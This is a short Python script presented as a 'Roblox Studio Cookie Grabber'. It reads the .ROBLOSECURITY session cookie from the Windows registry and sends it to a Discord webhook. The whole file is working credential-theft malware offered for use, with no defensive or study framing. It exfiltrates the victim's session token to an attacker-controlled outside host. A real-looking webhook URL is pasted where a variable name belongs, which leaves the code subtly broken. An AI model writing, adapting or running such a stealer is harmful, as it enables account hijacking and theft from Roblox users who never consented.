'''
Roblox Studio Cookie Grabber // Registry Key

By vesper#0003

'''
# import libs
import requests
from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue

https://discord.com/api/webhooks/1004790900695765112/qayrYNTJlOaODu_uJ1TdB4nvILpj-G9c2wRgQgdOa4Xku2tPvv6kKHTzY1S0qlFyeOHY = "" # Put your discord webhook in here

def GrabCookie():
    # opening the roblox studio key
    robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
    # finding the subkey called ".robloxsecurity"
    try:
        count = 0
        while True:
            name, value, type = EnumValue(robloxstudiopath, count)
            if name == ".ROBLOSECURITY":
                # returns the value of .robloxsecurity
                return value
            count = count + 1
    except WindowsError:
        pass
try:
    # This will try to return the value of the subkey ".robloxsecurity"
    roblox_cookie_value = str(GrabCookie())
    # try to get the exact cookie
    roblox_cookie = roblox_cookie_value.split("COOK::<")[1].split(">")[0]
    # post cookie to your webhook
    requests.post(webhook, json={"username":"Roblox Cookie Grabber","content":f"```{roblox_cookie}```"})
    # The roblox studio path wasn't found
except:pass
